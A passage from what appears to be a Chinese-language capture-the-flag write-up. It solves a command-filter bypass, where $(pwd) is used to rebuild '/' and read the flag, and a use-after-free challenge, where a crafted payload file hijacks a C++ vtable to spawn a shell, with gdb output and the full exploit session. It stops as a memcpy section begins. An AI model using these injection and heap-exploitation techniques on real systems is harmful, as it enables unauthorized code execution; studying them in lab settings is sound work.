</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>filter</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>cmd</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>r</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>r</span> <span class=o>+=</span> <span class=n>strstr</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span><span class=s>&#34;=&#34;</span><span class=p>)</span><span class=o>!=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>r</span> <span class=o>+=</span> <span class=n>strstr</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span><span class=s>&#34;PATH&#34;</span><span class=p>)</span><span class=o>!=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>r</span> <span class=o>+=</span> <span class=n>strstr</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span><span class=s>&#34;export&#34;</span><span class=p>)</span><span class=o>!=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>r</span> <span class=o>+=</span> <span class=n>strstr</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span><span class=s>&#34;/&#34;</span><span class=p>)</span><span class=o>!=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>r</span> <span class=o>+=</span> <span class=n>strstr</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span><span class=s>&#34;`&#34;</span><span class=p>)</span><span class=o>!=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>r</span> <span class=o>+=</span> <span class=n>strstr</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span><span class=s>&#34;flag&#34;</span><span class=p>)</span><span class=o>!=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>r</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>extern</span> <span class=kt>char</span><span class=o>**</span> <span class=n>environ</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>delete_env</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span><span class=o>**</span> <span class=n>p</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span><span class=p>(</span><span class=n>p</span><span class=o>=</span><span class=n>environ</span><span class=p>;</span> <span class=o>*</span><span class=n>p</span><span class=p>;</span> <span class=n>p</span><span class=o>++</span><span class=p>)</span>	<span class=n>memset</span><span class=p>(</span><span class=o>*</span><span class=n>p</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>strlen</span><span class=p>(</span><span class=o>*</span><span class=n>p</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[],</span> <span class=kt>char</span><span class=o>**</span> <span class=n>envp</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=n>delete_env</span><span class=p>();</span>
</span></span><span class=line><span class=cl>	<span class=n>putenv</span><span class=p>(</span><span class=s>&#34;PATH=/no_command_execution_until_you_become_a_hacker&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=n>filter</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]))</span> <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;%s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>	<span class=n>system</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这次删除了所有环境变量并覆盖了 <code>PATH</code>，同时增强了对命令行参数的过滤，关键在于 <code>/</code> 被过滤了，不能直接写路径。</p><p>那么我们就需要执行系统命令来构造出 <code>/</code>，很容易想到 <code>pwd</code> 命令。我们先 <code>cd /</code>，此时运行 <code>pwd</code> 可以看到输出就是 <code>/</code>。</p><p>仿照 cmd1：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ /home/cmd2/cmd2 <span class=s2>&#34;</span><span class=k>$(</span><span class=nb>pwd</span><span class=k>)</span><span class=s2>bin</span><span class=k>$(</span><span class=nb>pwd</span><span class=k>)</span><span class=s2>cat </span><span class=k>$(</span><span class=nb>pwd</span><span class=k>)</span><span class=s2>home</span><span class=k>$(</span><span class=nb>pwd</span><span class=k>)</span><span class=s2>cmd2</span><span class=k>$(</span><span class=nb>pwd</span><span class=k>)</span><span class=s2>fla*&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>但是这样没有用，猜想是因为 <code>$(pwd)</code> 先被替换成 <code>/</code> 了，因为双引号不会忽略 <code>$</code>。我们用单引号就可以防止这一替换。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ /home/cmd2/cmd2 <span class=s1>&#39;$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fla*&#39;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=uaf>uaf</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;iostream&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;cstring&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;cstdlib&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=k>using</span> <span class=k>namespace</span> <span class=n>std</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Human</span><span class=p>{</span>
</span></span><span class=line><span class=cl><span class=k>private</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=k>virtual</span> <span class=kt>void</span> <span class=n>give_shell</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=n>system</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>protected</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>age</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>string</span> <span class=n>name</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>public</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=k>virtual</span> <span class=kt>void</span> <span class=n>introduce</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=n>cout</span> <span class=o>&lt;&lt;</span><span class=s>&#34;My name is &#34;</span> <span class=o>&lt;&lt;</span> <span class=n>name</span> <span class=o>&lt;&lt;</span> <span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>cout</span> <span class=o>&lt;&lt;</span><span class=s>&#34;I am &#34;</span><span class=o>&lt;&lt;</span> <span class=n>age</span> <span class=o>&lt;&lt;</span><span class=s>&#34; years old&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Man</span><span class=o>:</span> <span class=k>public</span> <span class=n>Human</span><span class=p>{</span>
</span></span><span class=line><span class=cl><span class=k>public</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=n>Man</span><span class=p>(</span><span class=n>string</span> <span class=n>name</span><span class=p>,</span> <span class=kt>int</span> <span class=n>age</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>this</span><span class=o>-&gt;</span><span class=n>name</span> <span class=o>=</span> <span class=n>name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>this</span><span class=o>-&gt;</span><span class=n>age</span> <span class=o>=</span> <span class=n>age</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>virtual</span> <span class=kt>void</span> <span class=nf>introduce</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=n>Human</span><span class=o>::</span><span class=n>introduce</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=n>cout</span> <span class=o>&lt;&lt;</span><span class=s>&#34;I am a nice guy!&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Woman</span><span class=o>:</span> <span class=k>public</span> <span class=n>Human</span><span class=p>{</span>
</span></span><span class=line><span class=cl><span class=k>public</span><span class=o>:</span>
</span></span><span class=line><span class=cl>        <span class=n>Woman</span><span class=p>(</span><span class=n>string</span> <span class=n>name</span><span class=p>,</span> <span class=kt>int</span> <span class=n>age</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=k>this</span><span class=o>-&gt;</span><span class=n>name</span> <span class=o>=</span> <span class=n>name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>this</span><span class=o>-&gt;</span><span class=n>age</span> <span class=o>=</span> <span class=n>age</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>virtual</span> <span class=kt>void</span> <span class=nf>introduce</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>                <span class=n>Human</span><span class=o>::</span><span class=n>introduce</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=n>cout</span> <span class=o>&lt;&lt;</span><span class=s>&#34;I am a cute girl!&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[]){</span>
</span></span><span class=line><span class=cl>    <span class=n>Human</span><span class=o>*</span> <span class=n>m</span> <span class=o>=</span> <span class=k>new</span> <span class=n>Man</span><span class=p>(</span><span class=s>&#34;Jack&#34;</span><span class=p>,</span> <span class=mi>25</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>Human</span><span class=o>*</span> <span class=n>w</span> <span class=o>=</span> <span class=k>new</span> <span class=n>Woman</span><span class=p>(</span><span class=s>&#34;Jill&#34;</span><span class=p>,</span> <span class=mi>21</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>size_t</span> <span class=n>len</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span><span class=o>*</span> <span class=n>data</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>op</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span><span class=p>(</span><span class=mi>1</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=n>cout</span> <span class=o>&lt;&lt;</span><span class=s>&#34;1. use</span><span class=se>\n</span><span class=s>2. after</span><span class=se>\n</span><span class=s>3. free</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>cin</span> <span class=o>&gt;&gt;</span> <span class=n>op</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>switch</span><span class=p>(</span><span class=n>op</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>1</span><span class=o>:</span>
</span></span><span class=line><span class=cl>                <span class=n>m</span><span class=o>-&gt;</span><span class=n>introduce</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=n>w</span><span class=o>-&gt;</span><span class=n>introduce</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>2</span><span class=o>:</span>
</span></span><span class=line><span class=cl>                <span class=n>len</span> <span class=o>=</span> <span class=n>atoi</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>                <span class=n>data</span> <span class=o>=</span> <span class=k>new</span> <span class=kt>char</span><span class=p>[</span><span class=n>len</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                <span class=n>read</span><span class=p>(</span><span class=n>open</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=n>O_RDONLY</span><span class=p>),</span> <span class=n>data</span><span class=p>,</span> <span class=n>len</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=n>cout</span> <span class=o>&lt;&lt;</span><span class=s>&#34;your data is allocated&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>3</span><span class=o>:</span>
</span></span><span class=line><span class=cl>                <span class=k>delete</span> <span class=n>m</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>delete</span> <span class=n>w</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>default</span><span class=o>:</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>本题最终肯定是要调用 <code>Human</code> 的 <code>give_shell</code> 函数，但程序不会直接调用。程序共有三种操作：</p><ul><li><code>use</code>: 调用 <code>Man</code> 和 <code>Woman</code> 对象的 <code>introduce</code> 函数</li><li><code>after</code>: 从 <code>argv[2]</code> 中读取长为 <code>argv[1]</code> 的数据，放到 <code>data</code> 中</li><li><code>free</code>: 释放 <code>Man</code> 和 <code>Woman</code> 对象的指针</li></ul><p>我们这里可以猜想是要将 <code>introduce</code> 函数劫持到 <code>give_shell</code> 上，但是具体怎么做？注意到 <code>give_shell</code> 和 <code>introduce</code> 都是被继承的虚函数，能不能通过改变函数虚表地址来劫持函数呢？</p><p>首先我们尝试找到 <code>Man</code> 的虚函数表。在 <code>main</code> 中找到 <code>Man</code> 构造函数的地址：</p><p><figure><a class=lightgallery href=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/1.png title="图 1" data-thumbnail=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/1.png data-sub-html="<h2> </h2><p>图 1</p>"><img class=lazyload src=/svg/loading.min.svg data-src=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/1.png data-srcset="https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/1.png, https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/1.png 1.5x, https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/1.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/1.png></a><figcaption class=image-caption>图 1</figcaption></figure></p><p>注意到对象被放到 <code>rbx</code> 里，我们在构造函数执行后下断点，可以查看 <code>Man</code> 的对象：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>(gdb) b *0x400f18
</span></span><span class=line><span class=cl>(gdb) c
</span></span><span class=line><span class=cl>(gdb) p/x $rbx
</span></span><span class=line><span class=cl>$1 = 0x1fe8c50
</span></span><span class=line><span class=cl>(gdb) x/8 0x1fe8c50
</span></span><span class=line><span class=cl>0x1fe8c50:	0x00401570	0x00000000	0x00000019	0x00000000
</span></span><span class=line><span class=cl>0x1fe8c60:	0x01fe8c38	0x00000000	0x000203a1	0x00000000
</span></span></code></pre></td></tr></table></div></div><p>由于虚函数表地址在对象首部，所以这里虚函数表地址就是 <code>0x401570</code>。我们继续看虚函数表：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>(gdb) x/8a 0x401570
</span></span><span class=line><span class=cl>0x401570 &lt;_ZTV3Man+16&gt;:	0x40117a &lt;_ZN5Human10give_shellEv&gt;	0x4012d2 &lt;_ZN3Man9introduceEv&gt;
</span></span><span class=line><span class=cl>0x401580 &lt;_ZTV5Human&gt;:	0x0	0x4015f0 &lt;_ZTI5Human&gt;
</span></span><span class=line><span class=cl>0x401590 &lt;_ZTV5Human+16&gt;:	0x40117a &lt;_ZN5Human10give_shellEv&gt;	0x401192 &lt;_ZN5Human9introduceEv&gt;
</span></span><span class=line><span class=cl>0x4015a0 &lt;_ZTS5Woman&gt;:	0x6e616d6f5735	0x0
</span></span></code></pre></td></tr></table></div></div><p>用 <code>a</code> 可以把函数名显示出来，可以看到 <code>Man</code> 和 <code>Human</code> 的 <code>give_shell</code> 虚函数地址相同，而 <code>introduce</code> 不同，这是符合 C++ 虚函数机制的：私有虚函数不能被继承，但是会在子类的虚函数表中出现。换句话说，子类调用的本质上还是父类的虚函数。</p><p>接下来用 IDA 分析，可以看到输入 <code>1</code> 的时候执行：</p><p><figure><a class=lightgallery href=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/2.png title="图 2" data-thumbnail=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/2.png data-sub-html="<h2> </h2><p>图 2</p>"><img class=lazyload src=/svg/loading.min.svg data-src=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/2.png data-srcset="https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/2.png, https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/2.png 1.5x, https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/2.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/2.png></a><figcaption class=image-caption>图 2</figcaption></figure></p><p>也就是两个 <code>introduce</code>，那么这里的 <code>v12</code> 和 <code>v13</code> 就可以确定是对应于 <code>m</code> 和 <code>w</code> 的虚指针了，之后转换为指针再 + 8，正好就是调用 <code>vtable + 8</code> 处的函数即 <code>introduce</code>。那么如果我们想让它执行位于 <code>vtable + 0</code> 的 <code>give_shell</code>，只需要在这句执行前让 <code>vtable</code> 的值减少 8 就行了。</p><p>而我们前面已经读到了 <code>vtable</code> 的值 <code>0x401570</code>，减 8 就是 <code>0x401568</code>。</p><p>说了这么多，怎么利用 <code>use</code>、<code>after</code> 和 <code>free</code> 三个过程来修改 <code>vtable</code> 值呢？我们知道，对于一块 <code>free</code> 操作释放掉的内存，仍然可能存在一个指针是指向它的，这个指针一般被称作悬空指针 <code>dangling pointer</code>。在这里，<code>m</code> 和 <code>w</code> 就属于悬空指针。</p><p>如果在这时，我们调用 <code>after</code> 过程，即分配一个<strong>等长</strong>的内存区域给 <code>data</code>，那么 <code>w</code> 所指的内存区域就会被分配。如果再次 <code>after</code>，那么 <code>m</code> 所指的内存区域也会被分配，这是由 <code>new/malloc</code> 的性质决定的。</p><p>现在，假如我们给 <code>data</code> 写入的是 <code>0x401568</code>，并且调用 <code>use</code> 过程，那么就会执行 <code>m->introduce()</code>，这会访问到 <code>0x401568 + 8 = 0x401570</code> 处的函数指针，恰好是 <code>m</code> 的 <code>vtable + 0</code> 处，也就变成了 <code>m->give_shell()</code>。</p><p>那么只剩下一个问题了，就是我们要分配多大的空间给 <code>data</code>，这在 IDA 中很容易发现：</p><p><figure><a class=lightgallery href=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/3.png title="图 3" data-thumbnail=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/3.png data-sub-html="<h2> </h2><p>图 3</p>"><img class=lazyload src=/svg/loading.min.svg data-src=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/3.png data-srcset="https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/3.png, https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/3.png 1.5x, https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/3.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/3.png></a><figcaption class=image-caption>图 3</figcaption></figure></p><p><code>0x18</code> 字节，也就是 24 字节。最终 payload（注意地址是三十二位的）：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ python -c <span class=s1>&#39;print&#34;\x68\x15\x40&#34;+&#34;\x00&#34;*5&#39;</span> &gt; /tmp/payload
</span></span><span class=line><span class=cl>$ ./uaf <span class=m>24</span> /tmp/payload
</span></span><span class=line><span class=cl>1. use
</span></span><span class=line><span class=cl>2. after
</span></span><span class=line><span class=cl>3. free
</span></span><span class=line><span class=cl><span class=m>3</span>
</span></span><span class=line><span class=cl>1. use
</span></span><span class=line><span class=cl>2. after
</span></span><span class=line><span class=cl>3. free
</span></span><span class=line><span class=cl><span class=m>2</span>
</span></span><span class=line><span class=cl>your data is allocated
</span></span><span class=line><span class=cl>1. use
</span></span><span class=line><span class=cl>2. after
</span></span><span class=line><span class=cl>3. free
</span></span><span class=line><span class=cl><span class=m>2</span>
</span></span><span class=line><span class=cl>your data is allocated
</span></span><span class=line><span class=cl>1. use
</span></span><span class=line><span class=cl>2. after
</span></span><span class=line><span class=cl>3. free
</span></span><span class=line><span class=cl><span class=m>1</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=memcpy>memcpy</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
